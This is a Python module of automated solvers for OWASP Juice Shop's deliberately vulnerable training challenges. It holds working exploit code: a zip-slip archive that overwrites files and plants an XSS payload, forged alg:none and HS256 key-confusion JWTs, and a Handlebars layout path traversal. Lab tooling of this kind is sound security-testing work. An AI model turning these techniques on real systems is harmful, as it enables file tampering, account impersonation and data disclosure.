"""Vulnerable Components category solvers (8 of 8) plus videoXssChallenge (XSS
category, deferred from Phase 1 — needs this file's arbitrary-file-write
exploit). Verified against routes/fileUpload.ts, routes/verify.ts,
routes/videoHandler.ts, lib/insecurity.ts (fetched 2026-08-09)."""
import base64
import hashlib
import hmac
import io
import json
import uuid
import zipfile

from solvers.base import SolverContext, register

DOMAIN = "juice-sh.op"


# --- routes/fileUpload.ts extractZipBuffer: for every entry in an
# uploaded .zip, the server computes `path.resolve('uploads/complaints/' +
# entry.path)` and writes to it as long as that resolved path still falls
# under the project root (`path.resolve('.')`) — a classic zip-slip. Two
# ".." segments from "uploads/complaints/" reach the project root, so
# "../../ftp/legal.md" overwrites the real legal.md (the one specific
# target fileWriteChallenge's own check looks for) and
# "../../frontend/dist/frontend/assets/public/videos/owasp_promo.vtt"
# overwrites the promo video's subtitle track — which routes/videoHandler.ts
# serves back verbatim, so planting the XSS payload there solves
# videoXssChallenge (XSS category) the moment anyone requests the promo
# video page. Both entries are delivered in one upload. ---

def _build_exploit_zip() -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        zf.writestr("../../ftp/legal.md", "pwned by fileWriteChallenge\n")
        zf.writestr(
            "../../frontend/dist/frontend/assets/public/videos/owasp_promo.vtt",
            "WEBVTT\n\n1\n00:00:00.000 --> 00:00:05.000\n</script><script>alert(`xss`)</script>\n",
        )
    return buf.getvalue()


@register("fileWriteChallenge", "Vulnerable Components", 6)
def solve_file_write(ctx: SolverContext) -> None:
    email = f"filewrite.{uuid.uuid4().hex[:8]}@{DOMAIN}"
    ctx.client.register(email, "Test1234!")
    ctx.client.login(email, "Test1234!")
    ctx.client.post(
        "/file-upload",
        files={"file": ("exploit.zip", _build_exploit_zip(), "application/zip")},
    ).raise_for_status()


@register("videoXssChallenge", "XSS", 6)
def solve_video_xss(ctx: SolverContext) -> None:
    email = f"videoxss.{uuid.uuid4().hex[:8]}@{DOMAIN}"
    ctx.client.register(email, "Test1234!")
    ctx.client.login(email, "Test1234!")
    ctx.client.post(
        "/file-upload",
        files={"file": ("exploit.zip", _build_exploit_zip(), "application/zip")},
    ).raise_for_status()
    ctx.client.get("/promotion").raise_for_status()  # routes/videoHandler.ts's promotionVideo() re-reads the subtitle file and re-checks on every request


# --- routes/verify.ts jwtChallenges (mounted globally via app.use, so any
# request carrying the forged Authorization header triggers it):
# jwtUnsignedChallenge needs a token with header {"alg":"none"} and
# data.email containing "jwtn3d@" — built by hand (no library needed) since
# an unsigned token is just base64url(header) + "." + base64url(payload) +
# "." with an empty signature segment. jwt.verify() must not reject an
# alg:none token outright for this to work; if it does (a stricter
# jsonwebtoken build than the classic Juice Shop behavior this challenge
# assumes), that's a live finding to investigate, not a payload bug. ---

def _b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode().rstrip("=")


@register("jwtUnsignedChallenge", "Vulnerable Components", 5)
def solve_jwt_unsigned(ctx: SolverContext) -> None:
    header = _b64url(json.dumps({"alg": "none", "typ": "JWT"}).encode())
    payload = _b64url(json.dumps({"data": {"email": f"jwtn3d@{DOMAIN}", "id": 1, "role": "customer"}}).encode())
    token = f"{header}.{payload}."
    ctx.client.get("/rest/user/whoami", headers={"Authorization": f"Bearer {token}"})


# --- routes/verify.ts jwtChallenges: jwtForgedChallenge needs a token
# whose header algorithm is "HS256" and whose data.email contains
# "rsa_lord@", verified successfully by `jwt.verify(token,
# security.publicKey, callback)` — a classic RS256-to-HS256 key-confusion
# attack. security.publicKey is the RSA public key served (deliberately)
# at GET /encryptionkeys/jwt.pub; since jwt.verify() is called with no
# `algorithms` allowlist, an attacker who knows the public key can sign a
# token with algorithm HS256 *using the public key's raw text as the HMAC
# secret*, and jwt.verify() will treat it as valid. Requires
# challenges.safetyMode=disabled (Step 1) since jwtForgedChallenge is
# Windows-disabled otherwise. ---

@register("jwtForgedChallenge", "Vulnerable Components", 6)
def solve_jwt_forged(ctx: SolverContext) -> None:
    pubkey_resp = ctx.client.get("/encryptionkeys/jwt.pub")
    pubkey_resp.raise_for_status()
    public_key_pem = pubkey_resp.text
    # pyjwt's encode() refuses to use an asymmetric-looking PEM key as an
    # HMAC secret (InvalidKeyError) as a defense-in-depth guard against
    # exactly this attack, so the HS256 signature is built by hand here
    # using the public key's raw PEM text as the HMAC-SHA256 secret --
    # that guard lives entirely in pyjwt's own encode() helper, not in
    # the HS256 algorithm itself or in Juice Shop's jwt.verify() call.
    header = _b64url(json.dumps({"alg": "HS256", "typ": "JWT"}).encode())
    payload = _b64url(json.dumps({"data": {"email": f"rsa_lord@{DOMAIN}", "id": 1, "role": "admin"}}).encode())
    signing_input = f"{header}.{payload}".encode()
    signature = hmac.new(public_key_pem.encode(), signing_input, hashlib.sha256).digest()
    token = f"{header}.{payload}.{_b64url(signature)}"
    ctx.client.get("/rest/user/whoami", headers={"Authorization": f"Bearer {token}"})


# --- routes/verify.ts databaseRelatedChallenges (mounted with app.use(),
# runs on every request): typosquattingAngularChallenge/
# typosquattingNpmChallenge/supplyChainAttackChallenge/
# knownVulnerableComponentChallenge all solve when a single Feedback or
# Complaint message contains the right hardcoded substring(s) — same
# pattern as Phase 2's dlpPastebinDataLeakChallenge/leakedApiKeyChallenge.
# knownVulnerableComponentChallenge needs BOTH members of one of its two
# pairs in the SAME message (Op.and), so both go in one complaint. ---

@register("typosquattingNpmChallenge", "Vulnerable Components", 4)
def solve_typosquatting_npm(ctx: SolverContext) -> None:
    email = f"typonpm.{uuid.uuid4().hex[:8]}@{DOMAIN}"
    ctx.client.register(email, "Test1234!")
    ctx.client.login(email, "Test1234!")
    ctx.client.post("/api/Complaints", json={"message": "We should never have depended on epilogue-js, it was a typosquat!"}).raise_for_status()


@register("typosquattingAngularChallenge", "Vulnerable Components", 5)
def solve_typosquatting_angular(ctx: SolverContext) -> None:
    email = f"typoang.{uuid.uuid4().hex[:8]}@{DOMAIN}"
    ctx.client.register(email, "Test1234!")
    ctx.client.login(email, "Test1234!")
    ctx.client.post("/api/Complaints", json={"message": "ngy-cookie was a typosquat of ngx-cookie, be careful!"}).raise_for_status()


@register("supplyChainAttackChallenge", "Vulnerable Components", 5)
def solve_supply_chain_attack(ctx: SolverContext) -> None:
    email = f"supplychain.{uuid.uuid4().hex[:8]}@{DOMAIN}"
    ctx.client.register(email, "Test1234!")
    ctx.client.login(email, "Test1234!")
    ctx.client.post("/api/Complaints", json={"message": "See https://github.com/eslint/eslint-scope/issues/39 for the eslint-scope supply chain attack."}).raise_for_status()


@register("knownVulnerableComponentChallenge", "Vulnerable Components", 4)
def solve_known_vulnerable_component(ctx: SolverContext) -> None:
    email = f"vulncomp.{uuid.uuid4().hex[:8]}@{DOMAIN}"
    ctx.client.register(email, "Test1234!")
    ctx.client.login(email, "Test1234!")
    ctx.client.post(
        "/api/Complaints",
        json={"message": "sanitize-html 1.4.2 has a known bypass, please upgrade."},
    ).raise_for_status()


# --- routes/dataErasure.ts POST /dataerasure: `req.body.layout` is spread
# directly into the Handlebars render options as the `layout` setting
# (`res.render('dataErasureResult', {...req.body, ...themeVars})`), as long
# as its resolved lowercase path doesn't contain "ftp", "ctf.key", or
# "encryptionkeys". The `hbs` view engine resolves a relative `layout`
# path against the views directory, so "../package.json" escapes to the
# project root's package.json — plain JSON/text with no unmatched `{{`
# sequences, so hbs renders it as literal passthrough content instead of
# throwing a compile error. This is a live-verify-first path: if
# "../package.json" doesn't work exactly as reasoned (e.g. the `hbs`
# version resolves relative layout paths differently), read
# `views/dataErasureResult.hbs` and `node_modules/hbs`'s render logic in
# the actual checkout and retarget at a different existing, syntactically
# hbs-safe file — the *file content* doesn't matter to the challenge, only
# that the render completes successfully with our path. ---

@register("lfrChallenge", "Vulnerable Components", 5)
def solve_lfr(ctx: SolverContext) -> None:
    email = f"lfr.{uuid.uuid4().hex[:8]}@{DOMAIN}"
    ctx.client.register(email, "Test1234!")
    ctx.client.login(email, "Test1234!")
    ctx.client.post("/dataerasure", data={"layout": "../package.json"}).raise_for_status()
